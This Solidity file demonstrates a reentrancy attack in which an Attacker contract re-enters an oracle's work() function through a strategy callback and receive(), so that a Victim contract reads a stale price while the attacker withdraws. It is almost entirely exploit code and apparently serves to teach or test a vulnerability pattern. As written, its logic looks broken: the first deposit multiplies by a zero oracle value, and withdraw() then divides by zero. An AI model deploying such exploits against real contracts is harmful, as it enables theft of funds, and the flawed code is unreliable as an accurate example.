// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStrategy {
    function execute() external;
}

contract Victim {
    Oracle_ree public o;
    mapping(address => uint256) public balances;
    
    constructor(address _o) {
        o = Oracle_ree(_o);
    }
    function withdraw() external  {
        uint256 amt = balances[msg.sender]/o.getterView();
        (bool success, ) = payable(msg.sender).call{value: amt}("");
        require (success, "Failed to withdraw ETH");
    }
    function deposit() external payable {
        balances[msg.sender] += msg.value * o.getterView();
    }
  
}

// THIS is the contract vulnerable to reentrancy
contract Oracle_ree {
    uint256 public totalETH;

    function work(address strategy) external payable {
        IStrategy(strategy).execute();
        totalETH += msg.value;
    }

    function getterView() external view returns (uint256) {
        return totalETH;
    }
}

contract Attacker is IStrategy {
    Victim public v;
    Oracle_ree public o;

    constructor(address payable _v, address _o) {
         v = Victim(_v);
         o = Oracle_ree(_o);
    }

    function attack() external {
        v.deposit{value: 1 ether}();
        o.work(address(this));
    }

    function execute() external {
        v.withdraw();
    }

    receive() external payable {
        o.work(address(this));
    }
 }